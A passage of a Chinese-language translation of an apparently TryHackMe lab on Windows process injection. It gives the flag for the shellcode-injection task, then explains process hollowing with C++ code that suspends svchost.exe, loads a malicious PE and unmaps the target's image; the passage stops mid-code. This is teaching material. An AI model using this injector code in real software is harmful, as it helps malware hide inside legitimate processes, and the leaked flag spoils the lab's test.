class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>整合上述步骤即可构建基础进程注入程序。请使用提供的C++注入器进行实验验证。</p>
<p>shellcode注入是进程注入的基础形态，在下一个任务中，我们将探讨如何调整这些步骤以实现进程镂空。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>确定以 THM-Attacker 身份运行的目标进程 PID。获取 PID 后，将其作为参数传递给桌面 Injectors 目录下的 shellcode-injector.exe 执行。</p><p>在注入 shellcode 之后获得的 flag 是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{1nj3c710n_15_fun!}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="expanding-process-abuse---扩展进程滥用">Expanding Process Abuse - 扩展进程滥用<a href="#expanding-process-abuse---扩展进程滥用" class="hash-link" aria-label="Direct link to Expanding Process Abuse - 扩展进程滥用" title="Direct link to Expanding Process Abuse - 扩展进程滥用">​</a></h2>
<p>在上一个任务中，我们讨论了如何利用 shellcode 注入技术将恶意代码注入到合法进程中。在本任务中，我们将探讨进程劫持（Process Hollowing）。与 shellcode 注入类似，该技术允许攻击者将整个恶意文件注入到目标进程中。这一过程通过“掏空”（Hollowing）或解除映射（Un-mapping）目标进程，并向其中注入特定的 PE（<strong>P</strong>ortable <strong>E</strong>xecutable，可移植可执行文件）数据和节（Sections）来实现。</p>
<p>从高层次来看，进程劫持可分为以下六个步骤：</p>
<ol>
<li>以挂起（Suspended）状态创建目标进程。</li>
<li>打开一个恶意映像文件。</li>
<li>从进程内存中解除映射合法代码。</li>
<li>分配内存用于存放恶意代码，并将每个节（Section）写入目标进程的地址空间。</li>
<li>设置恶意代码的入口点。</li>
<li>解除目标进程的挂起状态，使其恢复执行。</li>
</ol>
<p>这些步骤也可以通过图示方式展现，以展示 Windows API 调用如何与进程内存交互。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/PgUp-code.github.io/assets/images/3c36b4470fb04e3bfdbbef0674b79ec2-fb72872e83dc44d695110078d41148a8.png" width="941" height="411" class="img_ev3q"></p>
<p>我们将分解一个基本的进程空洞注入器，识别每个步骤并进一步解释。</p>
<p>在进程空洞的第一步，我们必须使用 <code>CreateProcessA</code> 创建一个处于挂起状态的目标进程。为了获取 API 调用所需的参数，我们可以使用 <code>STARTUPINFOA</code> 和 <code>PROCESS_INFORMATION</code> 结构体。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">LPSTARTUPINFOA target_si </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">STARTUPINFOA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 定义进程的工作站、桌面、句柄和外观</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPPROCESS_INFORMATION target_pi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">PROCESS_INFORMATION</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 进程和主线程的信息</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CONTEXT c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 上下文结构体指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">CreateProcessA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPSTR</span><span class="token punctuation" style="color:#393A34">)</span><span class="token string" style="color:#e3116c">&quot;C:\\\\Windows\\\\System32\\\\svchost.exe&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 要执行的模块名称</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	TRUE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 句柄由调用进程继承</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	CREATE_SUSPENDED</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 新进程处于挂起状态</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_si</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 指向启动信息的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 指向进程信息的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	cout </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[!] Failed to create Target process. Last Error: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetLastError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第二步，我们需要打开一个恶意文件进行注入。这个过程分为三个步骤，首先通过使用 <code>CreateFileA</code> 获取恶意文件的句柄。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hMaliciousCode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateFileA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPCSTR</span><span class="token punctuation" style="color:#393A34">)</span><span class="token string" style="color:#e3116c">&quot;C:\\\\Users\\\\tryhackme\\\\malware.exe&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 要获取的恶意文件名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	GENERIC_READ</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 只读访问</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	FILE_SHARE_READ</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 只读共享模式</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	OPEN_EXISTING</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 如果文件或设备存在则打开</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦获得了恶意文件的句柄，就需要使用 <code>VirtualAlloc</code> 为本地进程分配内存。同时，使用 <code>GetFileSize</code> 获取恶意文件的大小来设置 <code>dwSize</code>。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DWORD maliciousFileSize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetFileSize</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hMaliciousCode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 恶意文件的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 返回没有错误</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PVOID pMaliciousImage </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	maliciousFileSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 恶意文件的大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 保留并提交页面 (MEM_RESERVE | MEM_COMMIT)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x04</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 启用读/写访问权限 (PAGE_READWRITE)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在，内存已经分配给本地进程，接下来需要将数据写入内存。通过使用前面步骤中获取的信息，我们可以使用 <code>ReadFile</code> 将恶意文件内容写入本地进程的内存。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DWORD numberOfBytesRead</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 存储读取的字节数</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token function" style="color:#d73a49">ReadFile</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hMaliciousCode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 恶意文件的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pMaliciousImage</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 分配的内存区域</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	maliciousFileSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 恶意文件的大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">numberOfBytesRead</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 读取的字节数</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	cout </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[!] Unable to read Malicious file into memory. Error:&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetLastError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">TerminateProcess</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">CloseHandle</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hMaliciousCode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第三步中，进程必须通过解除映射内存来进行“空心化”。在解除映射之前，我们需要确定 API 调用的参数。我们需要识别进程在内存中的位置和入口点。CPU 寄存器 <code>EAX</code>（入口点）和 <code>EBX</code>（PEB 位置）包含我们需要获取的信息；这些可以通过 <code>GetThreadContext</code> 获取。一旦获取了这两个寄存器，我们就可以使用 <code>ReadProcessMemory</code> 从 <code>EBX</code> 获取基地址，并且通过偏移量（<code>0x8</code>），这个偏移量是通过检查 PEB 获取的。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ContextFlags </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> CONTEXT_INTEGER</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 仅存储 CPU 寄存器的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">GetThreadContext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的线程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c </span><span class="token comment" style="color:#999988;font-style:italic">// 用于存储获取到的上下文的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取当前线程的上下文</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PVOID pTargetImageBaseAddress</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ReadProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	target_pi</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 PROCESS_INFORMATION 结构中获取的进程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PVOID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Ebx </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 指向基地址的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">pTargetImageBaseAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 存储目标基地址 </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PVOID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 要读取的字节数</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 无需读取字节数的输出</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在基地址存储后，我们可以开始解除映射内存。我们可以使用从 <em>ntdll.dll</em> 导入的 <code>ZwUnmapViewOfSection</code> 来释放目标进程的内存。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HMODULE hNtdllBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetModuleHandleA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;ntdll.dll&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取 ntdll 的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pfnZwUnmapViewOfSection pZwUnmapViewOfSection </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pfnZwUnmapViewOfSection</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">GetProcAddress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hNtdllBase</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// ntdll 的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token string" style="color:#e3116c">&quot;ZwUnmapViewOfSection&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 要获取的 API 调用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 从 ntdll 获取 ZwUnmapViewOfSection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD dwResult </span><span class="token operator" style="color:#393A34">=</span><span class="token 